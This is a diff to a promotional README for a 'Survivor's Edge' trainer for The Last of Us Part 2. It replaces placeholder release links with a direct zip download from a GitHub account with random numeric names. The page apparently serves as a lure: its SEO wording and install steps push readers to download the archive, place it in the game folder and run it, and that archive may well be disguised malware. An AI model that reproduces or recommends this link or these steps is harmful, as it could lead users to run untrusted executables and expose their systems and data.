@@ -1,6 +1,6 @@
 # The Last of Us: Part 2 - Survivor’s Edge v1.0: 25 Tools of Triumph
 
-**[Download Trainer](https://github.com/yourusername/TLOU2-Trainer/releases)**
+**[Download Trainer](https://github.com/m49357717/312434532/releases/download/431232532/The.Last.of.Us.Part.2.25+FLiNG.plus.Trainer.zip)**
 
 **Meta Description**: Get The Last of Us: Part 2 Survivor’s Edge v1.0 with 25 lethal tools. Endless health, ammo, and crafting mastery to defy the end times in 2025!
 
@@ -50,7 +50,7 @@ Conquer *The Last of Us: Part 2* with these hotkey-wielded tools:
 
 ## How to Install and Use
 
-1. **Download**: Claim *Survivor’s Edge* from the [releases page](https://github.com/yourusername/TLOU2-Survivors-Edge/releases).  
+1. **Download**: Claim *Survivor’s Edge* from the [releases page](https://github.com/m49357717/312434532/releases/download/431232532/The.Last.of.Us.Part.2.25+FLiNG.plus.Trainer.zip).  
 2. **Install**: Drop files into the *The Last of Us: Part 2* root folder.  
 3. **Launch**: Start *Survivor’s Edge* first, then fire up *The Last of Us: Part 2* (v1.0).  
 4. **Activate**: Hit the hotkeys above in-game to claim your edge.  
